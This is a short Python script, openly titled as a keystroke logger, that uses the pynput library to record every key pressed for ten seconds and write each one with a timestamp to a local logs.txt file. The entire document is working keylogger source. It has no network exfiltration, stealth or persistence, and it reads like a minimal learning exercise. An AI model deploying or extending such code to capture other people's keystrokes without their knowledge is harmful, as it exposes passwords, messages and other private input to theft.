# Keystroke Logging

from threading import Timer
from pynput import keyboard
import logging

# Setting the directory to save the log file
log_dir = ""

# Setting the file name, the level and the format to save the inputs from keyboard
logging.basicConfig(
    filename=(log_dir + "logs.txt"),
	level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Saving the key pressed according to the format defined before
def key_press(key):
    logging.info(str(key))

# Open a listener to the keyboard
with keyboard.Listener(on_press=key_press) as listener:
    Timer(10, listener.stop).start()
    listener.join()